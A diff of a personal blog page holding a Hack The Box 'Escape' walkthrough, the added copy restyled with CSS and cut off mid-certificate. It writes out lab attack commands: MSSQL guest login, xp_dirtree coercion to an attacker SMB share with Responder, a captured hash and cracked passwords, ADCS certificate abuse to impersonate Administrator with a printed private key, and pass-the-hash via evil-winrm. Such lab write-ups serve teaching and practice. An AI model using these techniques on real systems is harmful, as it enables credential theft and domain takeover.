@@ -1,1 +1,411 @@
-<html><head><meta charset="utf-8"></head><body><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Shell as sql_svc</u></strong></span></p><p>&nbsp;</p><p>Anonymous SMB access is enabled</p><p>&nbsp;</p><p>Username</p><p><a href="mailto:brandon.brown@sequel.htb">brandon.brown@sequel.htb</a></p><p>&nbsp;</p><p><br>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Using impacket we can sign into the mssql server</p><p><code>impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202&nbsp;</code></p><p>&nbsp;</p><p>Using this command below we can reach out to an external SMB share and use responder to capture the hash</p><p><code>sudo responder -I tun0</code></p><p><code>EXEC xp_dirtree '\\10.10.14.2\share'</code></p><p>&nbsp;</p><figure class="image"><img style="aspect-ratio:1267/194;" src="../img/posts/2024-05-15-Escape(HTB)/01-3c2217d153.png" width="1267" height="194"></figure><p>&nbsp;</p><p>[SMB] NTLMv2-SSP Client &nbsp; : 10.10.11.202<br>[SMB] NTLMv2-SSP Username : sequel\sql_svc<br>[SMB] NTLMv2-SSP Hash &nbsp; &nbsp; : sql_svc::sequel:7631d77ef1809e8e:C5DB46C039E1E3A9A05EE7AB4A53891E:010100000000000080A07C4B269CDA0192BCDF41A651E827000000000200080043004C003600480001001E00570049004E002D00380056004400440033005000560053004E0041004B0004003400570049004E002D00380056004400440033005000560053004E0041004B002E0043004C00360048002E004C004F00430041004C000300140043004C00360048002E004C004F00430041004C000500140043004C00360048002E004C004F00430041004C000700080080A07C4B269CDA01060004000200000008003000300000000000000000000000003000004A58C3ABFB960EE91E9C14995189622FE639D5D286C3D626E05574B54576F7640A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000</p><p>&nbsp;</p><p>hash cracks to REGGIE1234ronnie</p><p>&nbsp;</p><p>sql_svc:REGGIE1234ronnie</p><p>&nbsp;</p><p>We have no user flag though, we need to pivot to Ryan.Cooper's account.</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Shell as Ryan Cooper</u></strong></span></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>We can find creds located in the error logs of mysql. Ryan accidently enters his password for user username.</p><p><code>C:\SQLServer\Logs&gt; type ErrorLog.bak</code></p><figure class="image"><img style="aspect-ratio:1259/265;" src="../img/posts/2024-05-15-Escape(HTB)/02-3e4c1d5fdf.png" width="1259" height="265"></figure><p>&nbsp;</p><p>&nbsp;</p><p>ryan.cooper:NuclearMosquito3</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Privilege escalation to admin</u></strong></span></p><p>&nbsp;</p><p>Using Certipy we can get the admin hash/TGT ticket</p><p>Tool is here - <a href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a></p><p>Guide is here - <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation</a></p><p>Also this was useful - <a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</a></p><p>&nbsp;</p><p>&nbsp;</p><p>First step was uploading certify.exe to the box and running it to find vulnerable tickets. The important things we need are highlighted in red.</p><p><code>.\certify.exe find /vulnerable</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1099/616;" src="../img/posts/2024-05-15-Escape(HTB)/03-063d18eaa7.png" width="1099" height="616"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Using the things highlighted in red we can generate a private key(cert.pem file)</p><p><code>.\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator</code></p><p>&nbsp;</p><p><span class="text-tiny"><code>-----BEGIN RSA PRIVATE KEY-----</code></span><br><span class="text-tiny"><code>MIIEowIBAAKCAQEArRCH7YZMWIxt2n+Dv6PaP78GFpMZCxnfzrFj867/wjK8LuNC</code></span><br><span class="text-tiny"><code>dMIrIlKQJFOPGOUW1vpqsXX7wHevNhosejyzHrB/OhvR/SghLnpCjiCkfUzNkW4C</code></span><br><span class="text-tiny"><code>faX82fRbojAStCeo7+dR9u2gR9d2KUGEILlHI8gcuLOuOZ9h9DG0R81yNgShOCPi</code></span><br><span class="text-tiny"><code>QsPYgoDUtW0EvjYAz59IQKLGXO8rIm0i7Q6907/n1b16DRs0kZuThTOv4qxvjHDY</code></span><br><span class="text-tiny"><code>GRs3bbvMy9qXCVI5jGoSX8ogO9ituLy//9mulasde6+vs0h893pA6pAIYDWyeIp0</code></span><br><span class="text-tiny"><code>dgiAcanmQsBccQ/bmcQqTpnUEpktnEkyxm2igQIDAQABAoIBACACwMGkZ5axUthp</code></span><br><span class="text-tiny"><code>YZse2Y2U7bFbP/SXspfuo8g9BD2NWNVrX61tBMFyeArgEcXPCex1oSp14jz1Zkkh</code></span><br><span class="text-tiny"><code>ijyJ4a+5ga7j2nFy7MBGCO11CDfM7vEJYhiPjTdbRV+4eJ0uAMdvB/Aef9kJ92cm</code></span><br><span class="text-tiny"><code>ISRUYN4zc2yOf5lU669ZSjlFvOxUnQM9zGhUvfVWyyvEUInh7B354DcIdcfO94Q6</code></span><br><span class="text-tiny"><code>Zy91VhPr+olCWC6K6zAuKV+gtqrUk0RxFYqZISx2Z7PqCPU8mmwn0V34OBcz0he2</code></span><br><span class="text-tiny"><code>VGolxwtQceNDqj2eJKvb06Cwth9XQl7XSmgGn0kRT1L0IW87CTr6v5mOH6hAlE2H</code></span><br><span class="text-tiny"><code>+3EyiYkCgYEAzhr5E8IKAGVLyrfThXDxjMVef99FPQFXfoOUDjdaytMg/p4aKq+T</code></span><br><span class="text-tiny"><code>NC+WXS065FRd3F1y93VItvHWbPF305RhP8yHVXsSiuCIz+6xrgh8WtasGze6AvNm</code></span><br><span class="text-tiny"><code>IaYEV9JhAffzQxzdFG81AOiIT4E0E7hJDitnaMIH6bEcILhm1G9iSKsCgYEA1vXp</code></span><br><span class="text-tiny"><code>Y3iMxVvp41+6RFWe4hzLnNCFAt5irkjlmHNhIbuE97iHBdqSkQW0FXzNB/b8ofHz</code></span><br><span class="text-tiny"><code>kmxZwBoVWjqQyKAIVwkeuY+o99LuBH0JKrUMSnkasOwzOZVteulgokBtuu2dls47</code></span><br><span class="text-tiny"><code>WbScWdMIqR+qAspWW26zX1dQjIWN2Vu/YCGdWYMCgYEAk7iJZTvh5z6y/+yZUj8N</code></span><br><span class="text-tiny"><code>IZQkkwn3mi3oA+lSqI3MKSsBrvyqTIXiv7iL0OSmHRjK3TKtP+dz4oua4CKBe8gR</code></span><br><span class="text-tiny"><code>m6SAKyg2tgsQg9fUyaOTXZgXarqaO5swTFWtLzS+CqcoV6XMXuUF3EzNxg4YwTmI</code></span><br><span class="text-tiny"><code>Qvug9lh7S2eBfYItUX0zuFkCgYAO7V66qJll7x8Lyg7+Rc/Vtdgx2I0UCOtjXO6M</code></span><br><span class="text-tiny"><code>qp55IDN4nFjMAESjS3kY8OSwA+fBOzMF3P5Sh70p2d1KAUry+FAo5KAALaaXqzMi</code></span><br><span class="text-tiny"><code>wxXKaiR/Wren7QeAPIqYWc8E5xFFcqbOcOtWlYAJdohwzyo2CTbtjPur9m5GRMfC</code></span><br><span class="text-tiny"><code>XjM2DwKBgCT/TCAdQAt6hnW0ur/5u+gHnm9WkjJEr2htW8wV8bvEP9+zdZ7O8USf</code></span><br><span class="text-tiny"><code>FVt6yL6I8+rH0VBZEUO9Uy4no20zQKGS7lzrQSFOv1Bh52wNh8qpwW9dxWPy6AdK</code></span><br><span class="text-tiny"><code>Cnh9msFonc8oU2eyrIW4A+qBsEbqKmTJWqv47qi4085iC8Tz3Gej</code></span><br><span class="text-tiny"><code>-----END RSA PRIVATE KEY-----</code></span><br><span class="text-tiny"><code>-----BEGIN CERTIFICATE-----</code></span><br><span class="text-tiny"><code>MIIGEjCCBPqgAwIBAgITHgAAABDRPCeEDofuoQAAAAAAEDANBgkqhkiG9w0BAQsF</code></span><br><span class="text-tiny"><code>ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs</code></span><br><span class="text-tiny"><code>MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjQwNTA0MDkwOTQ1WhcNMzQwNTAy</code></span><br><span class="text-tiny"><code>MDkwOTQ1WjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG</code></span><br><span class="text-tiny"><code>c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi</code></span><br><span class="text-tiny"><code>MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCtEIfthkxYjG3af4O/o9o/vwYW</code></span><br><span class="text-tiny"><code>kxkLGd/OsWPzrv/CMrwu40J0wisiUpAkU48Y5RbW+mqxdfvAd682Gix6PLMesH86</code></span><br><span class="text-tiny"><code>G9H9KCEuekKOIKR9TM2RbgJ9pfzZ9FuiMBK0J6jv51H27aBH13YpQYQguUcjyBy4</code></span><br><span class="text-tiny"><code>s645n2H0MbRHzXI2BKE4I+JCw9iCgNS1bQS+NgDPn0hAosZc7ysibSLtDr3Tv+fV</code></span><br><span class="text-tiny"><code>vXoNGzSRm5OFM6/irG+McNgZGzdtu8zL2pcJUjmMahJfyiA72K24vL//2a6Vqx17</code></span><br><span class="text-tiny"><code>r6+zSHz3ekDqkAhgNbJ4inR2CIBxqeZCwFxxD9uZxCpOmdQSmS2cSTLGbaKBAgMB</code></span><br><span class="text-tiny"><code>AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9</code></span><br><span class="text-tiny"><code>lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI</code></span><br><span class="text-tiny"><code>KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV</code></span><br><span class="text-tiny"><code>CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq</code></span><br><span class="text-tiny"><code>hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF</code></span><br><span class="text-tiny"><code>Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFLdpfrxJajL18I8Scn8jm3n2+zLX</code></span><br><span class="text-tiny"><code>MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud</code></span><br><span class="text-tiny"><code>IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg</code></span><br><span class="text-tiny"><code>gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi</code></span><br><span class="text-tiny"><code>bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv</code></span><br><span class="text-tiny"><code>bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz</code></span><br><span class="text-tiny"><code>ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE</code></span><br><span class="text-tiny"><code>gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049</code></span><br><span class="text-tiny"><code>QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv</code></span><br><span class="text-tiny"><code>bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/</code></span><br><span class="text-tiny"><code>b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF</code></span><br><span class="text-tiny"><code>AAOCAQEADu9nxoqEAQh9/tHLVjPMY4PPTIYmq5tVSt2gw4c/pIjeV9RGvRF8Qzy/</code></span><br><span class="text-tiny"><code>kh5oWNASILgn+HWhNxOodTJm6u4+gfS0qFWcgqLKdB4/wwGlEYkswIiULWUMR1h4</code></span><br><span class="text-tiny"><code>fT8NDMiCruNWmPo0rW0Vczvq1lAXkLeBJ4BGT5ti6yK6Q4kyHTQjMFvGNdYEuc6P</code></span><br><span class="text-tiny"><code>hI4m9lD6HD+r2SzWeKDdsi3ITGk/H5/uPrN7w4YEcIxSiBu2z2hS32L0Y9eI+lXI</code></span><br><span class="text-tiny"><code>EnT7TjfBwh7c/X58gcYHZyxuQYrp+4Pcb7HRQQ01yu14se5bFBAdeqCSkOt7oNei</code></span><br><span class="text-tiny"><code>RSQ7z+oJe//gBHsvW6F8KnGsoVtwSg==</code></span><br><span class="text-tiny"><code>-----END CERTIFICATE-----</code></span><br>&nbsp;</p><p>We then copy that key to our machine and name it cert.pem and use the command below to turn it into a pfx file.</p><p><code>openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx</code></p><p>&nbsp;</p><p>Due to kerberos my time was different from the machine so we have to use ntupdate to make our times match up.</p><p><code>ntpdate 10.10.11.202</code></p><p>&nbsp;</p><p>Now that its in the proper format and we have the proper time we can use certipy to give us the tgt and hash.</p><p><code>python3 entry.py auth -pfx 'cert.pfx' -username 'Administrator' -domain 'sequel.htb' -dc-ip 10.10.11.202</code><br>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:993/193;" src="../img/posts/2024-05-15-Escape(HTB)/04-e441b81603.png" width="993" height="193"></figure><p>&nbsp;</p><p>I spent a while trying to crack the ntlm hash or use a pass the hash tool but kept getting errors. Like usual i over complicated things a ton. We can just pass the hash with evil-winrm</p><p>&nbsp;</p><p><code>evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee</code></p></body></html>
+<html><head><meta charset="utf-8">
+    <title>HTB: Escape | HackWithJordan</title><style>
+        :root {
+            --bg: #0b0e14;
+            --accent: #5eead4;
+            --violet: #7c8cf8;
+            --text: #e8edf2;
+            --muted: #8b97a6;
+            --surface: rgba(255, 255, 255, .04);
+            --border: rgba(255, 255, 255, .09);
+            --accent-dim: rgba(94, 234, 212, .14);
+            --border-hover: rgba(94, 234, 212, .45);
+            --sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            --mono: 'Cascadia Code', 'JetBrains Mono', 'Fira Code', Consolas, monospace;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--sans);
+            line-height: 1.65;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        ::selection {
+            background: var(--accent-dim);
+            color: var(--accent);
+        }
+
+        #bg-canvas {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .blob {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(110px);
+            opacity: .5;
+            z-index: 0;
+            pointer-events: none;
+            will-change: transform;
+        }
+
+        .blob-1 {
+            width: 55vw;
+            height: 55vw;
+            top: -20vw;
+            left: -15vw;
+            background: radial-gradient(circle, rgba(94, 234, 212, .16), transparent 70%);
+            animation: drift1 26s ease-in-out infinite alternate;
+        }
+
+        .blob-2 {
+            width: 48vw;
+            height: 48vw;
+            bottom: -18vw;
+            right: -12vw;
+            background: radial-gradient(circle, rgba(124, 140, 248, .16), transparent 70%);
+            animation: drift2 32s ease-in-out infinite alternate;
+        }
+
+        .blob-3 {
+            width: 34vw;
+            height: 34vw;
+            top: 40%;
+            left: 55%;
+            background: radial-gradient(circle, rgba(94, 234, 212, .10), transparent 70%);
+            animation: drift3 22s ease-in-out infinite alternate;
+        }
+
+        @keyframes drift1 {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(6vw, 4vw) scale(1.15); }
+        }
+
+        @keyframes drift2 {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(-5vw, -6vw) scale(1.1); }
+        }
+
+        @keyframes drift3 {
+            from { transform: translate(0, 0) scale(1); }
+            to { transform: translate(-4vw, 5vw) scale(.9); }
+        }
+
+        article.post {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 96px 28px 80px;
+        }
+
+        .post-header {
+            border-bottom: 2px solid var(--violet);
+            padding-bottom: 18px;
+            margin-bottom: 36px;
+        }
+
+        .post-header h1 {
+            font-size: 2.1rem;
+            line-height: 1.2;
+            color: var(--violet);
+            font-weight: 700;
+            letter-spacing: -0.01em;
+        }
+
+        .post-header .post-meta {
+            color: var(--muted);
+            font-size: 0.95rem;
+            margin-top: 8px;
+            font-family: var(--mono);
+            letter-spacing: 0.3px;
+        }
+
+        .post h1 {
+            color: var(--violet);
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin: 44px 0 14px;
+        }
+
+        .post h2 {
+            color: var(--violet);
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin: 36px 0 12px;
+        }
+
+        .post h3 {
+            color: var(--violet);
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin: 28px 0 10px;
+        }
+
+        .post p {
+            margin: 15px 0;
+        }
+
+        .post a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .post a:hover {
+            text-decoration: underline;
+        }
+
+        .post img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 20px auto;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+        }
+
+        .post figure {
+            margin: 20px 0;
+        }
+
+        .post pre.terminal {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: var(--mono);
+            font-size: 0.88rem;
+            line-height: 1.55;
+            margin: 18px 0;
+            color: var(--text);
+        }
+
+        .post code {
+            font-family: var(--mono);
+            font-size: 0.9em;
+            background: var(--surface);
+            padding: 2px 6px;
+            border-radius: 4px;
+            overflow-wrap: anywhere;
+        }
+
+        .post pre code {
+            background: none;
+            padding: 0;
+        }
+
+        .post ul,
+        .post ol {
+            margin: 15px 0 15px 24px;
+        }
+
+        .post li {
+            margin: 6px 0;
+        }
+
+        .post hr {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 32px 0;
+        }
+
+        .post table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 18px 0;
+            font-size: 0.95rem;
+        }
+
+        .post th,
+        .post td {
+            border: 1px solid var(--border);
+            padding: 8px 12px;
+            text-align: left;
+        }
+
+        .post th {
+            background: var(--surface);
+            color: var(--violet);
+        }
+
+        @media (max-width: 640px) {
+            article.post {
+                padding: 72px 20px 60px;
+            }
+
+            .post-header h1 {
+                font-size: 1.7rem;
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            .blob {
+                animation: none;
+            }
+        }
+    
+        .home-btn {
+            position: fixed;
+            top: 24px;
+            right: 28px;
+            z-index: 5;
+            font-family: var(--mono);
+            font-size: 0.85rem;
+            color: var(--muted);
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 7px 14px;
+            text-decoration: none;
+            transition: color 0.2s ease, border-color 0.2s ease;
+        }
+        .home-btn:hover {
+            color: var(--accent);
+            border-color: var(--border-hover);
+        }
+</style>
+</head><body>
+    <a class="home-btn" href="../" title="Back to home">~$ cd ~</a>
+    <canvas id="bg-canvas"></canvas>
+    <div class="blob blob-1"></div>
+    <div class="blob blob-2"></div>
+    <div class="blob blob-3"></div>
+
+    <article class="post">
+        <header class="post-header">
+            <h1>HTB: Escape</h1>
+            <div class="post-meta">May 15, 2024 &bull; HTB</div>
+        </header>
+
+<p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Shell as sql_svc</u></strong></span></p><p>&nbsp;</p><p>Anonymous SMB access is enabled</p><p>&nbsp;</p><p>Username</p><p><a href="mailto:brandon.brown@sequel.htb">brandon.brown@sequel.htb</a></p><p>&nbsp;</p><p><br>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Using impacket we can sign into the mssql server</p><p><code>impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202&nbsp;</code></p><p>&nbsp;</p><p>Using this command below we can reach out to an external SMB share and use responder to capture the hash</p><p><code>sudo responder -I tun0</code></p><p><code>EXEC xp_dirtree '\\10.10.14.2\share'</code></p><p>&nbsp;</p><figure class="image"><img style="aspect-ratio:1267/194;" src="../img/posts/2024-05-15-Escape(HTB)/01-3c2217d153.png" width="1267" height="194"></figure><p>&nbsp;</p><p>[SMB] NTLMv2-SSP Client &nbsp; : 10.10.11.202<br>[SMB] NTLMv2-SSP Username : sequel\sql_svc<br>[SMB] NTLMv2-SSP Hash &nbsp; &nbsp; : sql_svc::sequel:7631d77ef1809e8e:C5DB46C039E1E3A9A05EE7AB4A53891E:010100000000000080A07C4B269CDA0192BCDF41A651E827000000000200080043004C003600480001001E00570049004E002D00380056004400440033005000560053004E0041004B0004003400570049004E002D00380056004400440033005000560053004E0041004B002E0043004C00360048002E004C004F00430041004C000300140043004C00360048002E004C004F00430041004C000500140043004C00360048002E004C004F00430041004C000700080080A07C4B269CDA01060004000200000008003000300000000000000000000000003000004A58C3ABFB960EE91E9C14995189622FE639D5D286C3D626E05574B54576F7640A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000</p><p>&nbsp;</p><p>hash cracks to REGGIE1234ronnie</p><p>&nbsp;</p><p>sql_svc:REGGIE1234ronnie</p><p>&nbsp;</p><p>We have no user flag though, we need to pivot to Ryan.Cooper's account.</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Shell as Ryan Cooper</u></strong></span></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>We can find creds located in the error logs of mysql. Ryan accidently enters his password for user username.</p><p><code>C:\SQLServer\Logs&gt; type ErrorLog.bak</code></p><figure class="image"><img style="aspect-ratio:1259/265;" src="../img/posts/2024-05-15-Escape(HTB)/02-3e4c1d5fdf.png" width="1259" height="265"></figure><p>&nbsp;</p><p>&nbsp;</p><p>ryan.cooper:NuclearMosquito3</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Privilege escalation to admin</u></strong></span></p><p>&nbsp;</p><p>Using Certipy we can get the admin hash/TGT ticket</p><p>Tool is here - <a href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a></p><p>Guide is here - <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation</a></p><p>Also this was useful - <a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</a></p><p>&nbsp;</p><p>&nbsp;</p><p>First step was uploading certify.exe to the box and running it to find vulnerable tickets. The important things we need are highlighted in red.</p><p><code>.\certify.exe find /vulnerable</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1099/616;" src="../img/posts/2024-05-15-Escape(HTB)/03-063d18eaa7.png" width="1099" height="616"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Using the things highlighted in red we can generate a private key(cert.pem file)</p><p><code>.\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator</code></p><p>&nbsp;</p><p><span class="text-tiny"><code>-----BEGIN RSA PRIVATE KEY-----</code></span><br><span class="text-tiny"><code>MIIEowIBAAKCAQEArRCH7YZMWIxt2n+Dv6PaP78GFpMZCxnfzrFj867/wjK8LuNC</code></span><br><span class="text-tiny"><code>dMIrIlKQJFOPGOUW1vpqsXX7wHevNhosejyzHrB/OhvR/SghLnpCjiCkfUzNkW4C</code></span><br><span class="text-tiny"><code>faX82fRbojAStCeo7+dR9u2gR9d2KUGEILlHI8gcuLOuOZ9h9DG0R81yNgShOCPi</code></span><br><span class="text-tiny"><code>QsPYgoDUtW0EvjYAz59IQKLGXO8rIm0i7Q6907/n1b16DRs0kZuThTOv4qxvjHDY</code></span><br><span class="text-tiny"><code>GRs3bbvMy9qXCVI5jGoSX8ogO9ituLy//9mulasde6+vs0h893pA6pAIYDWyeIp0</code></span><br><span class="text-tiny"><code>dgiAcanmQsBccQ/bmcQqTpnUEpktnEkyxm2igQIDAQABAoIBACACwMGkZ5axUthp</code></span><br><span class="text-tiny"><code>YZse2Y2U7bFbP/SXspfuo8g9BD2NWNVrX61tBMFyeArgEcXPCex1oSp14jz1Zkkh</code></span><br><span class="text-tiny"><code>ijyJ4a+5ga7j2nFy7MBGCO11CDfM7vEJYhiPjTdbRV+4eJ0uAMdvB/Aef9kJ92cm</code></span><br><span class="text-tiny"><code>ISRUYN4zc2yOf5lU669ZSjlFvOxUnQM9zGhUvfVWyyvEUInh7B354DcIdcfO94Q6</code></span><br><span class="text-tiny"><code>Zy91VhPr+olCWC6K6zAuKV+gtqrUk0RxFYqZISx2Z7PqCPU8mmwn0V34OBcz0he2</code></span><br><span class="text-tiny"><code>VGolxwtQceNDqj2eJKvb06Cwth9XQl7XSmgGn0kRT1L0IW87CTr6v5mOH6hAlE2H</code></span><br><span class="text-tiny"><code>+3EyiYkCgYEAzhr5E8IKAGVLyrfThXDxjMVef99FPQFXfoOUDjdaytMg/p4aKq+T</code></span><br><span class="text-tiny"><code>NC+WXS065FRd3F1y93VItvHWbPF305RhP8yHVXsSiuCIz+6xrgh8WtasGze6AvNm</code></span><br><span class="text-tiny"><code>IaYEV9JhAffzQxzdFG81AOiIT4E0E7hJDitnaMIH6bEcILhm1G9iSKsCgYEA1vXp</code></span><br><span class="text-tiny"><code>Y3iMxVvp41+6RFWe4hzLnNCFAt5irkjlmHNhIbuE97iHBdqSkQW0FXzNB/b8ofHz</code></span><br><span class="text-tiny"><code>kmxZwBoVWjqQyKAIVwkeuY+o99LuBH0JKrUMSnkasOwzOZVteulgokBtuu2dls47</code></span><br><span class="text-tiny"><code>WbScWdMIqR+qAspWW26zX1dQjIWN2Vu/YCGdWYMCgYEAk7iJZTvh5z6y/+yZUj8N</code></span><br><span class="text-tiny"><code>IZQkkwn3mi3oA+lSqI3MKSsBrvyqTIXiv7iL0OSmHRjK3TKtP+dz4oua4CKBe8gR</code></span><br><span class="text-tiny"><code>m6SAKyg2tgsQg9fUyaOTXZgXarqaO5swTFWtLzS+CqcoV6XMXuUF3EzNxg4YwTmI</code></span><br><span class="text-tiny"><code>Qvug9lh7S2eBfYItUX0zuFkCgYAO7V66qJll7x8Lyg7+Rc/Vtdgx2I0UCOtjXO6M</code></span><br><span class="text-tiny"><code>qp55IDN4nFjMAESjS3kY8OSwA+fBOzMF3P5Sh70p2d1KAUry+FAo5KAALaaXqzMi</code></span><br><span class="text-tiny"><code>wxXKaiR/Wren7QeAPIqYWc8E5xFFcqbOcOtWlYAJdohwzyo2CTbtjPur9m5GRMfC</code></span><br><span class="text-tiny"><code>XjM2DwKBgCT/TCAdQAt6hnW0ur/5u+gHnm9WkjJEr2htW8wV8bvEP9+zdZ7O8USf</code></span><br><span class="text-tiny"><code>FVt6yL6I8+rH0VBZEUO9Uy4no20zQKGS7lzrQSFOv1Bh52wNh8qpwW9dxWPy6AdK</code></span><br><span class="text-tiny"><code>Cnh9msFonc8oU2eyrIW4A+qBsEbqKmTJWqv47qi4085iC8Tz3Gej</code></span><br><span class="text-tiny"><code>-----END RSA PRIVATE KEY-----</code></span><br><span class="text-tiny"><code>-----BEGIN CERTIFICATE-----</code></span><br><span class="text-tiny"><code>MIIGEjCCBPqgAwIBAgITHgAAABDRPCeEDofuoQAAAAAAEDANBgkqhkiG9w0BAQsF</code></span><br><span class="text-tiny"><code>ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs</code></span><br><span class="text-tiny"><code>MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjQwNTA0MDkwOTQ1WhcNMzQwNTAy</code></span><br><span class="text-tiny"><code>MDkwOTQ1WjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG</code></span><br><span class="text-tiny"><code>c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi</code></span><br><span class="text-tiny"><code>MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCtEIfthkxYjG3af4O/o9o/vwYW</code></span><br><span class="text-tiny"><code>kxkLGd/OsWPzrv/CMrwu40J0wisiUpAkU48Y5RbW+mqxdfvAd682Gix6PLMesH86</code></span><br><span class="text-tiny"><code>G9H9KCEuekKOIKR9TM2RbgJ9pfzZ9FuiMBK0J6jv51H27aBH13YpQYQguUcjyBy4</code></span><br><span 